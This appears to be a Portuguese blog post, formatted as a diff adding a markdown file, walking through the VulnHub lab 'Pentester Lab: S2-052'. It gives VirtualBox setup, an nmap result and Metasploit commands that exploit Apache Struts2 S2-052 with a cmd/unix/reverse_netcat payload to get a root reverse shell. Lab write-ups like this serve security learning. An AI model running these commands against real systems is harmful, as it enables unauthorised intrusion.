@@ -1,0 +1,52 @@
+# Maquina Virtual 2 #VM02
+
+## title: Maquina Virtual 2 #VM02
+author:
+date: 2023-06-26 18:34:00 -0300
+
+categories: [Blogging]
+tags: [blog]
+
+# # Fazendo o Download Do Nosso Alvo
+
+O alvo selecionado para este post é a máquina "Pentester Lab: S2-052". Para fazer o download, você pode acessar o link fornecido [aqui](https://www.vulnhub.com/entry/pentester-lab-s2-052,206/). Após o download, você pode importar a máquina virtual para o VirtualBox seguindo as seguintes etapas:
+
+1. Clique no botão "Novo" ou execute o atalho "Ctrl + N" para criar uma nova máquina virtual.
+2. Na janela de criação, você pode configurar o nome da máquina virtual como "vm02" e manter a pasta de instalação padrão.
+3. Selecione a opção "Oracle Linux (64-bit)" como sistema operacional.
+4. Em seguida, selecione a opção para escolher o arquivo [ISO](https://www.controle.net/faq/o-que-e-uma-imagem-iso) baixado como imagem ISO da máquina virtual.
+5. Finalize a configuração da máquina virtual seguindo as etapas adicionais do assistente.
+6. Após a conclusão da instalação, certifique-se de que a máquina virtual esteja desligada. Clique com o botão direito sobre ela e vá para as configurações.
+7. Na seção de configurações de rede, defina a placa de rede para o modo "Bridge" para garantir a conectividade adequada.
+
+Após concluir as etapas mencionadas anteriormente, você pode iniciar sua máquina virtual para começar a exploração. Certifique-se de que a máquina virtual esteja selecionada no VirtualBox e clique no botão "Iniciar" para ligá-la. Aguarde até que o sistema operacional seja inicializado completamente dentro da máquina virtual.
+
+# # Começo Da Nossa Exploração
+
+Acessando nosso alvo em nosso navegador vamos nos automaticamente ser redirecionados para o diretório ‘’’/orders/’’, rodando o “[nmap](https://www.linuxforce.com.br/comandos-linux/comandos-linux-comando-nmap/)” com as variáveis “sV -v -Pn”, vamos obter a resposta que o site so roda 1 serviço na porta 80 sendo ele:
+
+```
+80/tcp open http Apache Tomcat/Coyote JSP engine 1.1
+```
+
+![Untitled](Maquina%20Virtual%202%20#VM02%20e63a583a646e402097867c8af78ec52c/Untitled.png)
+
+# # Preparando o Nosso Exploit
+
+Na descrição da máquina é informado que devemos explorar a vulnerabilidade [Struts S2](https://www.devmedia.com.br/introducao-ao-struts-2/28127)-052, para isso devemos abrir o nosso terminal e digitar “msfconsole” apos isso devemos digitar “search Struts2 rest xstream”, logo apos devemos digitar “use 0”
+
+![Untitled](Maquina%20Virtual%202%20#VM02%20e63a583a646e402097867c8af78ec52c/Untitled%201.png)
+
+# # Configurando e Executando Nosso Exploit
+
+Para obter acesso às configurações necessárias em nosso exploit, devemos executar o comando "options". Isso nos mostrará os parâmetros que precisamos alterar: "RHOSTS, RPORT, LHOST, LPORT, TARGETURI". Vou explicar cada um deles detalhadamente.
+
+1. "RHOSTS": Neste parâmetro, você deve inserir o endereço IP do alvo usando o comando "set RHOSTS <ip_do_alvo>".
+2. "RPORT": Aqui, você precisa fornecer a porta aberta no alvo. Neste caso, a porta é "80", então você pode usar o comando "set RPORT 80" para configurá-lo.
+3. "LHOST": Insira o endereço IP da sua máquina neste parâmetro. Utilize o comando "set LHOST <seu_ip>".
+4. "LPORT": Escolha uma porta de sua preferência. Geralmente, a porta "443" é utilizada. Utilize o comando "set LPORT 443" para configurá-la.
+5. "TARGETURI": Este é o diretório afetado pelo exploit. Com base no nosso exploit, o diretório é "/struts2-rest-showcase/orders/3". Se você já está navegando dentro do site e está no diretório "/orders/3", você pode remover o restante do código e configurar o parâmetro usando o comando "set TARGETURI /orders/3".
+
+Após configurar o exploit, você pode executá-lo utilizando os comandos "run" ou "exploit". Certifique-se de que você alterou o payload para "cmd/unix/reverse_netcat" usando o comando "set payload cmd/unix/reverse_netcat". Após executar o exploit, você pode digitar "id" para verificar se obteve acesso como root no alvo
+
+![Untitled](Maquina%20Virtual%202%20#VM02%20e63a583a646e402097867c8af78ec52c/Untitled%202.png)
